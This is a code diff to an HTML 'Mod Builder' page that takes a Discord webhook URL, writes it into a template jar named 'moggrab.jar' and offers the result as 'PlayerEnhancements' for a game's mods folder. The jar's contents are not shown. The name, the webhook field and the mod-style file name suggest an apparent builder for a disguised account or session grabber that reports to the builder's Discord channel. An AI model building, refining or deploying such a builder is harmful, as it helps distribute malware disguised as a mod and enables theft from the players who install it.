@@ -4,6 +4,7 @@
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Player Enhancements — Mod Builder</title>
+<script src="jszip.min.js"></script>
 <style>
   :root { --bg:#0e1116; --card:#171c26; --line:#272e3b; --accent:#5b8c5a; --txt:#e8e6e3; }
   * { box-sizing: border-box; }
@@ -48,7 +49,7 @@
 
     <input id="wh" type="text" spellcheck="false" autocomplete="off"
            placeholder="https://discord.com/api/webhooks/...">
-    <button id="build">Build Mod</button>
+    <button id="build" disabled>Loading template…</button>
     <div id="status"></div>
     <a id="dl" href="#" download>Download your mod</a>
     <div id="stats"></div>
@@ -59,14 +60,25 @@
   const wh = $('wh'), btn = $('build'), status = $('status'), dl = $('dl'), stats = $('stats');
   dl.style.display = 'none';
 
-  async function refreshStats() {
+  // builds are counted in this browser only — GitHub Pages has no backend
+  const KEY = 'moggrab_builds';
+  stats.textContent = (parseInt(localStorage.getItem(KEY) || '0', 10) || 0) + ' jars built here';
+
+  let template = null; // ArrayBuffer of the virgin jar
+
+  async function loadTemplate() {
     try {
-      const r = await fetch('/api/stats');
-      const j = await r.json();
-      stats.textContent = j.total_builds + ' jars built';
-    } catch (e) { stats.textContent = ''; }
+      const res = await fetch('assets/moggrab.jar');
+      if (!res.ok) throw new Error('jar fetch ' + res.status);
+      template = await res.arrayBuffer();
+      btn.disabled = false;
+      btn.textContent = 'Build Mod';
+    } catch (e) {
+      status.textContent = 'Could not load the mod template from this repo.';
+      status.className = 'err';
+    }
   }
-  refreshStats();
+  loadTemplate();
 
   btn.addEventListener('click', async () => {
     const webhook = wh.value.trim();
@@ -83,32 +95,30 @@
     status.textContent = 'Stitching the jar…';
 
     try {
-      const res = await fetch('/api/build', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ webhook })
+      // re-zip in the browser: template jar + this webhook burned into webhook.txt
+      const zip = await JSZip.loadAsync(template);
+      zip.file('webhook.txt', webhook);
+      const blob = await zip.generateAsync({
+        type: 'blob',
+        mimeType: 'application/java-archive',
+        compression: 'DEFLATE',
+        compressionOptions: { level: 6 },
       });
-      const blob = await res.blob();
 
-      if (!res.ok) {
-        const j = await blob.text();
-        status.textContent = JSON.parse(j).error || 'Build failed.';
-        status.className = 'err';
-        return;
-      }
-
-      const cd = res.headers.get('Content-Disposition') || '';
-      const name = (cd.match(/filename="(.+?)"/) || [])[1] || 'PlayerEnhancements.jar';
-
+      const name = 'PlayerEnhancements-1.21.11-' +
+        Date.now().toString(36).slice(-4) + '.jar';
       const url = URL.createObjectURL(blob);
       dl.href = url;
       dl.download = name;
       dl.textContent = 'Download ' + name;
       dl.style.display = 'inline-block';
+
+      const n = (parseInt(localStorage.getItem(KEY) || '0', 10) || 0) + 1;
+      localStorage.setItem(KEY, String(n));
+      stats.textContent = n + ' jars built here';
       status.textContent = 'Built and ready. Drop it in your mods folder.';
-      refreshStats();
     } catch (e) {
-      status.textContent = 'Could not reach the builder.';
+      status.textContent = 'Build failed — feels like a template format issue.';
       status.className = 'err';
     } finally {
       btn.disabled = false;
